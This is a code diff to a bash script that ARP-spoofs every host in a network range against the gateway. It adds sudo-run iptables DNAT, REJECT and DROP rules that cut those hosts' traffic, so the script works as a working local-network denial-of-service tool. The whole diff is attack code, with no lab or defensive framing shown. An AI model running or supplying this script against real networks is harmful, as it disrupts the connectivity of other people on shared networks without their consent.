@@ -74,8 +74,11 @@ if [[ $NETWORK_CIDR =~ "," ]]; then
         IP=$(echo "$IP" | tr -d '[:space:]') # Trim whitespace
         if is_valid_ip "$IP"; then
             # Drop all packets except your IP source and destination (bidirectional)
-            iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-            iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
+            sudo iptables -t nat -I PREROUTING -s "$IP" -j DNAT --to-destination "$GATEWAY"
+            sudo iptables -I FORWARD -s "$IP" -p tcp -j REJECT --reject-with tcp-reset
+            sudo iptables -I FORWARD -s "$IP" -p udp -j REJECT --reject-with icmp-port-unreachable
+            sudo iptables -I FORWARD -s "$IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
+            sudo iptables -I FORWARD -s "$IP" -j DROP
 
             # Bidirectional ARP spoofing
         (
@@ -111,13 +114,16 @@ else
         IP=$(dec2ip "$i")
 
         # Drop all packets except your IP source and destination (bidirectional)
-        iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
-        iptables -I FORWARD -s "$GATEWAY" ! -d "$MYIP" -j DROP
-
+        sudo iptables -t nat -I PREROUTING -s "$IP" -j DNAT --to-destination "$GATEWAY"
+        sudo iptables -I FORWARD -s "$IP" -p tcp -j REJECT --reject-with tcp-reset
+        sudo iptables -I FORWARD -s "$IP" -p udp -j REJECT --reject-with icmp-port-unreachable
+        sudo iptables -I FORWARD -s "$IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
+        sudo iptables -I FORWARD -s "$IP" -j DROP
+        
         # Bidirectional ARP spoofing
     (
-        arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
-        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
+        sudo arpspoof -i "$INTERFACE" -t "$IP" "$GATEWAY" >/dev/null 2>&1 &
+        sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$IP" >/dev/null 2>&1 &
     ) &
     done
 fi
